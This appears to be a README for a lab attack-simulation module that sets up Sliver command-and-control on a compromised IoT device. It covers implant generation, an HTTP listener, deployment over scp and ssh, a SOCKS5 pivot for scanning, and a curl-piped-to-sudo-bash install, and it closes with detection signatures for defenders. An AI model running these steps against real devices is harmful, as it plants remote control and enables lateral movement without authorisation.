# 06_c2 — Command & Control

**Script:** `c2.sh`  
**Session label:** `c2`  
**ATT&CK:** T1071 (Application Layer Protocol), T1571 (Non-Standard Port)  
**Kill-chain phase:** Command and Control

## Overview

Establishes a Sliver C2 beacon between the attack host and a previously compromised lab device. Sliver is the open-source C2 framework named in the supervisor's catalogue.

## Prerequisites

- Sliver C2 framework installed on the attack host (see `01_setup/attack-host-setup.md`).
- A foothold on the target (SSH credentials from 04_brute_force or shell from 05_cve_exploit).
- The target device's architecture known (ARM is typical for embedded IoT).

## Install Sliver (one time)

```bash
curl https://sliver.sh/install | sudo bash
sudo systemctl enable --now sliver   # start the server daemon
```

## Usage

```bash
# 1. Generate a beacon implant for the compromised device
./06_c2/c2.sh gen  10.100.101.60  4444    # lhost = attack host WireGuard IP, lport = listener port

# 2. Start the HTTP listener and a delivery HTTP server
./06_c2/c2.sh serve  10.100.101.60  4444

# 3. Deploy beacon to the compromised target (SSH_USER env var sets the login)
SSH_USER=admin ./06_c2/c2.sh beacon  10.100.101.10  10.100.101.60  4444

# 4. List active beacons
./06_c2/c2.sh list
```

## What it does

| Step | Command | What happens |
|---|---|---|
| `gen` | `sliver-server generate beacon --http lhost:lport --os linux --arch arm` | Generates an ELF beacon binary for ARM Linux |
| `serve` | `sliver-server jobs --http lhost:lport` + Python HTTP server | Starts the C2 listener and serves the binary |
| `beacon` | `scp beacon.elf` + `ssh nohup beacon &` | Copies and launches beacon on the compromised host |
| `list` | `sliver-client -- beacons` | Shows active beacon check-ins |

## Alternative: Sliver SOCKS5 pivot

Once a beacon is active, open a SOCKS5 tunnel for lateral movement:

```bash
# In sliver-client interactive shell:
sliver > use <beacon-id>
sliver (lab_beacon) > socks5 start --host 127.0.0.1 --port 1080
# Then on attack host:
proxychains4 nmap -sT -Pn 192.168.x.0/24
```

## Evidence

Runs write to `runs/c2/<ts>_<target>/`:
- `cmd.txt` — exact sliver commands
- `gen.txt` — implant generation output
- `listener.txt` — listener start output
- `scp.txt`, `ssh.txt` — deployment output
- `beacons.txt` — beacon listing
- `result` — add manually: `success` (beacon checks in), `fail`, etc.

## Detection signature

- DNS / HTTP traffic from an IoT device to the attack host IP (not its normal cloud endpoint).
- Periodic (beacon interval) outbound HTTP/HTTPS on a non-standard port.
- Unexpected process running on the device (`/tmp/sliver_beacon`).
